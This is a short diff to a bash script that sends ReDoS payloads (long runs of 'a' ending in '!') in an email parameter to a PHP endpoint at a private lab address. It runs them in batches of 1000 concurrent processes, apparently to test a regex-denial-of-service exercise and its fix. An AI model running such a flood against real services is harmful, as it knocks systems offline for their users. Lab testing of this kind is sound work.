@@ -2,7 +2,7 @@
 SECONDS=0
 
 task(){
-    curl -s "http://192.168.154.132/redos/solution.php?email=aaaaaaaaaaaaaaa!&password=test" > /dev/null
+    curl -s "http://192.168.154.132/redos/solution.php?email=aaaaaaaaaaaaaaaaaaaa!&password=test" > /dev/null
 }
 
 # N-process batches, every batch has N concurrent processes
@@ -11,7 +11,7 @@ N=1000
 (
 
 # for loop
-for (( c=1; c<=10000 ; c++))
+for (( c=1; c<=5000 ; c++))
 
 	do
 
